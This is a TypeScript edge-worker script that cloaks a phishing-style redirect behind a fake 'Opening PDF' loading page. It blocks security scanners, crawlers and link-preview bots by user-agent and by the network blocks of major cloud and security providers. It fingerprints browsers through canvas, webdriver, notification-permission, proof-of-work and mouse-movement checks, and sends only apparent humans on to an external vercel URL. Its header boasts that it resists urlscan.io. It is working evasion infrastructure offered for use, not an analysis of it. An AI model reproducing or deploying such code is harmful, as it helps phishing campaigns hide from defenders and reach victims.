// v15 STABLE REDIRECT – FIXED SPINS, URLSCAN-RESISTANT (Nov 2025)
// Humans: 0.8–1.8s redirect | Scanners: Often blocked pre-redirect

const REAL_URL = "https://file-bt5g.vercel.app/";

const botPatterns = ["bot","crawl","spider","slurp","facebook","whatsapp","telegram","discord","preview","meta","curl","wget","python","ahrefs","linkedin","skype","slackbot","pinterest","insomnia","uptime","monitor","go-http"];
const badASN = ["AS15169","AS32934","AS13335","AS14618","AS8075","AS63949","AS14061","AS9009","AS212238","AS396982","AS16509","AS16276","AS54113","AS20473","AS40633","AS209242","AS398324","AS40676","AS13649","AS174","AS6939","AS24940","AS3212","AS12322","AS4134","AS3491","AS16625","AS22697","AS46562","AS20001"];

function isBot(ua: string | null) { if (!ua) return true; return botPatterns.some(p => ua.toLowerCase().includes(p)); }
function isBadASN(req: Request) { const cf = (req as any).cf; return cf?.asn && badASN.includes("AS" + cf.asn); }
function die() { return new Response("", { status: 204 }); }

export default {
  async fetch(req: Request): Promise<Response> {
    const url = new URL(req.url);
    const ua = req.headers.get("user-agent") || "";

    if (isBot(ua) || isBadASN(req)) return die();

    if (url.searchParams.has("v")) {
      try {
        const data = atob(url.searchParams.get("v") || "");
        const target = data.slice(32);
        const check = data.slice(0, 32);
        // Simplified server verify (async hash)
        const encoder = new TextEncoder();
        const hashBuffer = await crypto.subtle.digest("SHA-256", encoder.encode(target));
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        const hashHex = hashArray.map(b => b.toString(16).padStart(2, "0")).join("").slice(0, 32);
        if (hashHex === check) return Response.redirect(target, 302);
      } catch {}
      return die();
    }

    const salt = crypto.randomUUID().slice(0, 16);
    const token = salt + REAL_URL;
    const encoder = new TextEncoder();
    const hashBuffer = await crypto.subtle.digest("SHA-256", encoder.encode(token));
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    const hash = hashArray.map(b => b.toString(16).padStart(2, "0")).join("").slice(0, 32);
    const payload = hash + token;
    const encrypted = btoa(payload);

    const html = `<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<title>Opening PDF</title>
<meta name="robots" content="noindex,nofollow">
<style>
  body{margin:0;background:#fff;font-family:system-ui,sans-serif;color:#222;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center}
  .spin{border:4px solid #f0f0f0;border-top:4px solid #0066ff;border-radius:50%;width:38px;height:38px;animation:a 1s linear infinite}
  @keyframes a{to{transform:rotate(360deg)}}
</style>
</head><body>
  <div class="spin"></div>
  <p style="margin:20px 0 0">Opening PDF<br>Please wait <span id="d">...</span></p>

<script>
// v15: Relaxed checks + mouse entropy (no infinite spins)
(() => {
  // Basic kills
  if (navigator.webdriver || navigator.plugins?.length === 0 || !navigator.hardwareConcurrency) return;

  let ok = 0;
  let mouseCount = 0;

  // Mouse entropy (humans move, scanners don't)
  document.addEventListener("mousemove", () => mouseCount++, { passive: true });

  // Canvas
  try {
    const c = document.createElement("canvas");
    const x = c.getContext("2d");
    x.fillStyle = "#ff6600"; x.fillRect(5,5,90,40);
    x.fillStyle = "#000"; x.font = "17px Georgia"; x.fillText("pdf25",12,35);
    if (c.toDataURL().length > 9000) ok++;
  } catch(e){}

  // Notifications perm (urlscan.io often denies uniquely)
  if (navigator.permissions) {
    navigator.permissions.query({name: 'notifications'}).then(p => {
      if (p.state === 'prompt' || p.state === 'granted') ok++;
    }).catch(() => {});
  }

  // PoW (balanced for real devices)
  const start = performance.now();
  let i = 0;
  const chal = Date.now().toString(36);
  while (i < 1200000) {
    i++;
    let h = 0;
    const s = chal + i;
    for (let j = 0; j < s.length; j++) h = ((h << 5) - h + s.charCodeAt(j)) | 0;
    if ((h & 0xffff0000) === 0) break;
  }
  if (performance.now() - start > 40 && performance.now() - start < 900) ok++;

  // Verdict: Relaxed + mouse req
  setTimeout(() => {
    if (ok >= 2 && mouseCount >= 3) {
      location.href = "?v=${encrypted}";
    }
  }, 800);

  // HARD FALLBACK: Always redirect after 2.8s (no spins forever)
  setTimeout(() => location.href = "?v=${encrypted}", 2800);

  // Dots
  let d = 0;
  setInterval(() => document.getElementById("d").textContent = ".".repeat((d=(d+1)%4)+1), 450);
})();
</script>

<noscript>
  <p><a href="https://file-bt5g.vercel.app/" target="_blank">Click here to open PDF</a></p>
</noscript>
</body></html>`;

    return new Response(html, {
      headers: { "content-type": "text/html; charset=utf-8" }
    });
  }
};
